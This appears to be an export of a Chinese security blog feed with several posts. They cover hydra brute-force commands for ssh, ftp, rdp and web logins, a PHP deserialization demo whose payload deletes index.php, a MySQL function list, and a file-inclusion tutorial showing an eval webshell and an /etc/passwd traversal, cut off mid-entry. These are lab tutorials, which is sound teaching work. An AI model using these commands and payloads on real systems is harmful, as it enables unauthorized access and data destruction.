    <content type="html"><![CDATA[<h2 id="0x00-hydra"><a href="#0x00-hydra" class="headerlink" title="0x00 hydra"></a>0x00 hydra</h2><p>hydra 是一个网络帐号破解工具，支持多种协议。其作者是van Hauser,David Maciejak与其共同维护。hydra在所有支持GCC的平台能很好的编译，包括Linux,所有版本的BSD,Mac OS, Solaris等。</p><h2 id="0x01-参数说明"><a href="#0x01-参数说明" class="headerlink" title="0x01 参数说明"></a>0x01 参数说明</h2><p>hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns]<br>[-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]</p><ul><li>-R 继续从上一次进度接着破解。</li><li>-S 采用SSL链接。</li><li>-s PORT 可通过这个参数指定非默认端口。</li><li>-l LOGIN 指定破解的用户，对特定用户破解。</li><li>-L FILE 指定用户名字典。</li><li>-p PASS 小写，指定密码破解，少用，一般是采用密码字典。</li><li>-P FILE 大写，指定密码字典。</li><li>-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。</li><li>-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。</li><li>-M FILE 指定目标列表文件一行一条。</li><li>-o FILE 指定结果输出文件。</li><li>-f 在使用-f参数以后，找到第一对登录名或者密码的时候中止破解。</li><li>-t TASKS 同时运行的线程数，默认为16。</li><li>-w TIME 设置最大超时的时间，单位秒，默认是30s。</li><li>-v / -V 显示详细过程。</li><li>server 目标ip</li><li>service 指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等。</li><li>OPT 可选项</li></ul><h2 id="0x02-使用范例"><a href="#0x02-使用范例" class="headerlink" title="0x02 使用范例"></a>0x02 使用范例</h2><ul><li>1.破解ssh：<br>hydra -l 用户名 -p 密码字典 -t 线程 ip ssh</li><li>2.破解ftp：<br>hydra ip ftp -l 用户名 -P 密码字典 -t 线程</li><li>3.破解web登录（get方式）：<br>hydra -l 用户名 -p 密码字典 -t 线程 -f ip http-get 127.0.0.1/admin/index.php</li><li>4.破解web登录（post方式）：<br>hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form “/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login”</li><li>5.破解https：<br>hydra -m /index.php -l 用户名 -P 密码字典 ip https</li><li>6.破解teamspeak：<br>hydra -l 用户名 -P 密码字典 -s 端口号 ip teamspeak</li><li>7.破解cisco：<br>hydra -P 密码字典 ip cisco</li><li>8.破解smb：<br>hydra -l 用户名 -P 密码字典 ip smb</li><li>9.破解pop3：<br>hydra -l 用户名 -P 密码字典 my.pop3.mail pop3</li><li>10.破解rdp：<br>hydra ip rdp -l 用户名 -P 密码字典 -V</li><li>11.破解http-proxy：<br>hydra -l 用户名 -p 密码字典 -t 线程 http-proxy://xxx.xxx.xxx.xxx</li><li>12.破解imap：<br>hydra -l 用户名 -P 密码字典 ip imap PLAIN</li></ul><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>hydra支持多种协议的爆破，并且使用方式简单灵活，是暴力测试必备良器，只需要自行提供字典，或根据实际情况生成社工字典，就可以运用到绝大多数场景。</p><p>这里提供一下博主经常使用的一些字典 <a href="https://github.com/echohun/tools/tree/master/%E5%AD%97%E5%85%B8">https://github.com/echohun/tools/tree/master/%E5%AD%97%E5%85%B8</a></p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>暴力破解</tag>
      
      <tag>hydra</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化漏洞</title>
    <link href="/2018/04/29/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2018/04/29/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-序列化和反序列化"><a href="#0x00-序列化和反序列化" class="headerlink" title="0x00 序列化和反序列化"></a>0x00 序列化和反序列化</h2><p>PHP序列化是将一个对象、数组、字符串等转化为字节流便于传输，比如跨脚本等。而PHP反序列化是将序列化之后的字节流还原成对象、字符、数组等。但是PHP序列化是不会保存对象的方法。  </p><p>serialize可以将变量转换为字节流并且在转换中可以保存当前变量的值；unserialize则可以将serialize生成的字节流变换回变量。</p><p>我们看一个序列化后再反序列化的例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&#x27;Content-Type: text/html; charset=gb2312&#x27;</span>);<br><span class="hljs-variable">$arr</span>=<span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;name&#x27;</span>]=<span class="hljs-string">&#x27;名字&#x27;</span>;<br><span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;age&#x27;</span>]=<span class="hljs-string">&#x27;21&#x27;</span>;<br><span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;sex&#x27;</span>]=<span class="hljs-string">&#x27;男&#x27;</span>;<br><span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]=<span class="hljs-string">&#x27;12345678910&#x27;</span>;<br><span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;address&#x27;</span>]=<span class="hljs-string">&#x27;上海&#x27;</span>;<br>var_dump(<span class="hljs-variable">$arr</span>);<br><span class="hljs-variable">$info</span>=serialize(<span class="hljs-variable">$arr</span>);<br>var_dump(<span class="hljs-variable">$info</span>);<br><span class="hljs-variable">$info_array</span>=unserialize(<span class="hljs-variable">$info</span>);<br>var_dump(<span class="hljs-variable">$info_array</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后输出结果：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/unserialize/unserialize01.png"></p><h2 id="0x01-PHP反序列化漏洞"><a href="#0x01-PHP反序列化漏洞" class="headerlink" title="0x01 PHP反序列化漏洞"></a>0x01 PHP反序列化漏洞</h2><p>PHP类中有一种特殊函数体的存在叫魔法函数，magic函数命名是以符号__开头的，比如 __construct, __destruct, __toString, __sleep, __wakeup等等。这些函数在某些情况下会自动调用，比如__construct当一个对象创建时被调用，__destruct当一个对象销毁时被调用，__toString当一个对象被当作一个字符串使用。<br>而在反序列化时，如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。我们在变量可控并且进行了unserialize操作的地方注入序列化对象，实现代码执行，那么就可能引发对象注入漏洞。</p><h2 id="0x02-简单测试"><a href="#0x02-简单测试" class="headerlink" title="0x02 简单测试"></a>0x02 简单测试</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&quot;demo&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br><span class="hljs-variable">$a_unser</span> = unserialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>比如上述代码，构造payload为<a href="http://127.0.0.1:800/test.php?test=O:1:&quot;A&quot;:1:%7Bs:4:&quot;test&quot;;s:5:&quot;hello&quot;;%7D">http://127.0.0.1:800/test.php?test=O:1:&quot;A&quot;:1:{s:4:&quot;test&quot;;s:5:&quot;hello&quot;;}</a><br>这里O表示对象，1表示对象名长度，”A”是对象名，下来的1是对象中的字段名，后面花括号中的s代表string，4代表长度，”test”是内容；s代表string，5代表长度，”hello”是内容。</p><p>下面是一些数据类型的代表字母：</p><ul><li>a - array</li><li>b - boolean</li><li>d - double</li><li>i - integer</li><li>o - common object</li><li>r - reference</li><li>s - string</li><li>C - custom object</li><li>O - class</li><li>N - null</li><li>R - pointer reference</li><li>U - unicode string</li></ul><p>反序列化后在脚本运行结束时就会调用_destruct函数，同时会覆盖test变量输出hello。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/unserialize/unserialize02.png"></p><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>我们再尝试一种方式利用漏洞。</p><p>先创建logfile.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogFile</span>    </span><br><span class="hljs-class"></span>&#123;    <br>    <span class="hljs-comment">// log文件名</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;error.log&#x27;</span>;<br>    <span class="hljs-comment">// 储存日志文件</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">LogData</span>(<span class="hljs-params"><span class="hljs-variable">$text</span></span>)    </span><br><span class="hljs-function">    </span>&#123;    <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Log some data: &#x27;</span> . <span class="hljs-variable">$text</span> . <span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;    <br>        file_put_contents(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-variable">$text</span>, FILE_APPEND);    <br>    &#125;<br>    <span class="hljs-comment">// 删除日志文件    </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)    </span><br><span class="hljs-function">    </span>&#123;    <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__destruct deletes &quot;&#x27;</span> . <span class="hljs-keyword">$this</span>-&gt;filename . <span class="hljs-string">&#x27;&quot; file. &lt;br /&gt;&#x27;</span>;    <br>        unlink(dirname(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-keyword">$this</span>-&gt;filename);    <br>    &#125;    <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这是一个很简单的日志文件处理的类，其中有一处需要注意的地方就是在对象消亡的时候，有一个析构函数来显示一条删除的提示并删除这个日志文件。</p><p>下来我们看一个使用他的例子,创建一个日志文件1.log，再创建一个log.php写入如下内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;logfile.php&#x27;</span>;    <br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> LogFile();    <br><span class="hljs-variable">$obj</span>-&gt;filename = <span class="hljs-string">&#x27;1.log&#x27;</span>;    <br><span class="hljs-variable">$obj</span>-&gt;LogData(<span class="hljs-string">&#x27;Test&#x27;</span>);<br><span class="hljs-comment">//一些操作</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这个例子里，我们创建了一个新的LogFile对象，filename是1.log，然后在一些我们进行的操作之后，对象要消亡时1.log就会被删除。这是一个正常的使用方式。</p><p>然后如果服务器其他位置的一个脚本unserialize.php可以进行反序列化，而且参数可控，比如下面代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;logfile.php&#x27;</span>;    <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span>    </span><br><span class="hljs-class"></span>&#123;    <br>    <span class="hljs-comment">// 类数据</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;    <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PrintData</span>(<span class="hljs-params"></span>)    </span><br><span class="hljs-function">    </span>&#123;    <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;User &#x27;</span> . <span class="hljs-keyword">$this</span>-&gt;name . <span class="hljs-string">&#x27; is &#x27;</span> . <span class="hljs-keyword">$this</span>-&gt;age . <span class="hljs-string">&#x27; years old. &lt;br /&gt;&#x27;</span>;    <br>    &#125;    <br>&#125;<br><span class="hljs-variable">$usr</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;usr_serialized&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span>   <br></code></pre></td></tr></table></figure><p>然后我们就可以在这里利用反序列化来对服务器上文件进行删除操作。</p><p>假如我们网站主页index.php是这样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;exist&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后我们正常访问是：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/unserialize/unserialize03.png"></p><p>然后我们在刚才可以调用unserialize函数的页面，url后面构造如下内容：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/serialize/unserialize.php?usr_serialized=O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;LogFile&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;index.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/unserialize/unserialize04.png"></p><p>就会发现，主页被删除：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/unserialize/unserialize05.png"></p><h2 id="0x04-应对"><a href="#0x04-应对" class="headerlink" title="0x04 应对"></a>0x04 应对</h2><ul><li>严格控制unserialize函数的参数，对unserialize后的变量内容进行检查，过滤</li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>php</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql数据库内置函数总结</title>
    <link href="/2018/04/28/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/"/>
    <url>/2018/04/28/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>熟练的掌握mysql语法和函数是开发人员和安全工作中必备的技能，所以决定将mysql的内置函数全部整理一遍，用作笔记。</p><h2 id="0x01-数学函数"><a href="#0x01-数学函数" class="headerlink" title="0x01 数学函数"></a>0x01 数学函数</h2><ul><li>greatest()——返回一组数中的最大值</li><li>least()——返回一组数中的最小值</li><li>floor()——返回一个数的向下取整</li><li>ceiling()——返回一个数的向上取整</li><li>round()——返回一个数四舍五入后的整数值</li><li>truncate()——把一个数字截取为指定小数位数的数字</li><li>abs()——返回一个数的绝对值</li><li>sign()——返回一个数的符号，正数返回1，负数返回-1，零返回0</li><li>sqrt()——返回一个数的平方根</li><li>pow()——以一个数作为另一个数的指数，并返回结果</li><li>sin()——返回一个角度(弧度)的正弦</li><li>cos()——返回一个角度(弧度)的余弦</li><li>tan()——返回一个角度(弧度)的正切</li><li>asin()——返回一个角度(弧度)的反正弦</li><li>acon()——返回一个角度(弧度)的反余弦</li><li>atan()——返回一个角度(弧度)的反正切</li><li>bin()——返回一个数的二进制，作为字符串</li><li>otc()——返回一个数的八进制，作为字符串</li><li>hex()——返回一个数的十六进制，作为字符串</li></ul><h2 id="0x02-聚合函数"><a href="#0x02-聚合函数" class="headerlink" title="0x02 聚合函数"></a>0x02 聚合函数</h2><ul><li>count()——求组中项数，返回int型整数</li><li>max()——求最大值</li><li>min()——求最小值</li><li>sum()——返回表达式所有值的和</li><li>avg()——求组中值的平均值</li><li>std()——返回给定表达式中所有值的标准差</li><li>variance()——返回给定表达式中所有值</li><li>group_concat()——返回由属于一组的列值连接组合而成的结果</li><li>bit_and()——逻辑与</li><li>bit_or()——逻辑或</li><li>bit_xor()——逻辑异或</li></ul><h2 id="0x03-字符串函数"><a href="#0x03-字符串函数" class="headerlink" title="0x03 字符串函数"></a>0x03 字符串函数</h2><ul><li>ascii(char)——返回表达式最左端字符的ascii码值</li><li>char(x1,x2,x3)——将括号中的多个数字转换成字符，结果组合成一个字符串</li><li>left(str,x)——返回从字符串左边开始指定的x个字符</li><li>right(str,x)——返回从字符串右边开始指定的x个字符</li><li>trim(str)——删除字符串首部和尾部所有空格</li><li>ltrim(str)——删除字符串首部所有空格</li><li>rtrim(str)——删除字符串尾部所有空格</li><li>rpad(str,n,pad)——用字符串pad对str的右边进行填补直到字符串str中字符大于等于n个，然后返回前n个字符</li><li>lpad(str,n,pad)——用字符串pad对str的左边进行填补直到字符串str中字符大于等于n个，然后返回前n个字符</li><li>replace(str1,str2,str3)——用字符串str3替换str1中出现的所有str2</li><li>concat(str1,str2…strn)——连接字符串</li><li>substring(expr,start,length)——返回expr中从start开始，长度为length的子串</li><li>strcmp(str1,str2)——比较两个字符串，相等返回0，str1大返回1，str2大返回-1</li></ul><h2 id="0x04-日期和时间函数"><a href="#0x04-日期和时间函数" class="headerlink" title="0x04 日期和时间函数"></a>0x04 日期和时间函数</h2><ul><li>now()——获取当前的日期和时间</li><li>curtime()——获取当前的时间</li><li>curdate()——获取当前的日期</li><li>year()——分析一个日期值返回其中年的部分</li><li>motnth()——以数值类型返回月的部分</li><li>monthname()——以字符串的类型返回月的部分</li><li>dayofyear()——返回这一天在这一年中的序数</li><li>dayofmonth()——返回这一天在这一月中的序数</li><li>dayofweek()——返回这一天在这一周中的序数</li><li>hour()——返回时间值的小时部分</li><li>minute()——返回时间值的分钟部分</li><li>second()——返回时间值的秒部分</li><li>data_add()——对日期进行增加操作</li><li>data_sub()——对日期进行减少操作</li></ul><h2 id="0x05-加密函数"><a href="#0x05-加密函数" class="headerlink" title="0x05 加密函数"></a>0x05 加密函数</h2><ul><li>aes_encrypt(str,key)和aes_decrypt(str,key)——对str用密钥key进行aes加密，解密</li><li>encode()和decode()——对一个字符串进行加密，解密</li><li>encrypt(str,key)——使用unix crypt()系统加密字符串（在windows上不可用）</li><li>password(str)——返回str加密后的字符串</li></ul><h2 id="0x06-控制流函数"><a href="#0x06-控制流函数" class="headerlink" title="0x06 控制流函数"></a>0x06 控制流函数</h2><ul><li>ifnull(expr1,expr2)——判断参数expr1是否为null，为null时返回expr2，否则返回expr1</li><li>nullif(expr1,expr2)——判断两个参数是否相等，如相等，返回null，如不相等，返回第一个参数</li><li>if(expr1,expr2,expr3)——如果expr1表达式为真，则返回expr2，否则返回expr3</li></ul><h2 id="0x07-格式化函数"><a href="#0x07-格式化函数" class="headerlink" title="0x07 格式化函数"></a>0x07 格式化函数</h2><ul><li>format()——把数值格式化为以逗号为间隔的数字序列</li><li>data_format()——把数值格式化成日期格式</li><li>time_format()——把数值格式化为时间格式</li></ul><h2 id="0x08-类型转换函数"><a href="#0x08-类型转换函数" class="headerlink" title="0x08 类型转换函数"></a>0x08 类型转换函数</h2><ul><li>cast(expr,AS type)——将一个值转换为指定的数据类型</li></ul><h2 id="0x09-系统信息函数"><a href="#0x09-系统信息函数" class="headerlink" title="0x09 系统信息函数"></a>0x09 系统信息函数</h2><ul><li>database()——返回当前数据库名</li><li>benchmark(n,expr)——将表达式expr重复运行n次</li><li>charset()——返回字符串的字符集</li><li>connection_id()——返回当前客户的连接id</li><li>found_rows()——将最后一次select查询的行数返回</li><li>user()——返回当前登陆的用户名</li><li>version()——返回当前mysql服务器版本</li></ul>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>渗透测试</tag>
      
      <tag>mysql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含漏洞</title>
    <link href="/2018/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <url>/2018/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-文件包含漏洞"><a href="#0x00-文件包含漏洞" class="headerlink" title="0x00 文件包含漏洞"></a>0x00 文件包含漏洞</h2><p>PHP文件包含漏洞，就是在通过函数包含文件时，由于没有对包含的文件名进行有效的过滤处理，被攻击者利用从而导致了包含了Web根目录以外的文件进来，就会导致文件信息的泄露甚至注入了恶意代码。</p><h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>文件包含漏洞主要是程序员把一些公用的代码写在一个单独的文件中，然后使用其他文件进行包含调用，如果需要包含的文件使用硬编码，一般是不会出现安全问题，但是有时可能不确定需要包含哪些具体文件，所以就会采用变量的形式来传递需要包含的文件，但是在使用包含文件的过程中，未对包含的变量进行检查及过滤，导致外部提交的恶意数据作为变量进入到了文件包含的过程中，从而导致提交的恶意数据被执行。  </p><p>文件包含通常分为本地文件包含(Local File Inclusion)和远程文件包含(Remote File Inclusion)。allow_url_fopen和 allow_url_include为0n的情况认为是远程文件包含漏洞，allow_url_fopen为off和 allow_url_include为0n为本地文件包含漏洞。</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>首先我们在wamp环境创建如下文件：</p><p>index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[p])&#123;<br><span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[p];<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;home.php&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>home.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;home&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>123.txt:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;123&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后访问index.php，出现home。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include01.png"></p><p>访问index.php?p=123.txt,出现123，则环境搭建完成。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include02.png"></p><h2 id="0x03-本地文件包含"><a href="#0x03-本地文件包含" class="headerlink" title="0x03 本地文件包含"></a>0x03 本地文件包含</h2><p>我们先尝试本地文件包含漏洞，即获取的文件在搭载漏洞网站的服务器上，我们可以先尝试在桌面创建一个test.txt，写入如下内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后通过file协议访问index.php?p=file:///C:/Users/Leticia/Desktop/test.txt，发现显示test，说明可以apache服务器的权限很高，可以访问其他盘符位置，这样就可以遍历整个机器读取其中的敏感信息。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include03.png"></p><p>如果将test.txt中的内容换成一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">eval</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;leticia&#x27;</span>])<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后重新访问index.php?p=file:///C:/Users/Leticia/Desktop/test.txt，用菜刀连接一句话木马，发现可以获取整个计算机的读写权限。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include04.png"></p><h2 id="0x04-远程文件包含"><a href="#0x04-远程文件包含" class="headerlink" title="0x04 远程文件包含"></a>0x04 远程文件包含</h2><p>我们再尝试远程文件包含，上面已经说过，要使allow_url_fopen和 allow_url_include为0n，所以远程文件包含非常少见，我们为了测试漏洞，就先打开wamp安装路径下的php.ini文件，将这两条改为ON。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include05.png"></p><p>然后我们在虚拟机上新建一个文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ok&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在虚拟机打开一个http server，然后访问index.php?p=<a href="http://192.168.31.203:8000/2.txt">http://192.168.31.203:8000/2.txt</a></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include06.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include07.png"></p><p>如果把2.txt文件改成一句话木马，即可用菜刀连接。</p><h2 id="0x05-利用方法"><a href="#0x05-利用方法" class="headerlink" title="0x05 利用方法"></a>0x05 利用方法</h2><p>文件包含漏洞有很多利用方式：</p><h4 id="1、读取敏感文件"><a href="#1、读取敏感文件" class="headerlink" title="1、读取敏感文件"></a>1、读取敏感文件</h4><p>如../../../../../etc/passwd来读取敏感文件。</p><h4 id="2、包含shell"><a href="#2、包含shell" class="headerlink" title="2、包含shell"></a>2、包含shell</h4><p>如有其他漏洞将shell写入目标服务器中，或者可以远程包含自己服务器的shell，就可以通过包含shell文件来通过目标服务器apache来执行shell，用来提权之类的操作。</p><h4 id="3、配合文件上传漏洞"><a href="#3、配合文件上传漏洞" class="headerlink" 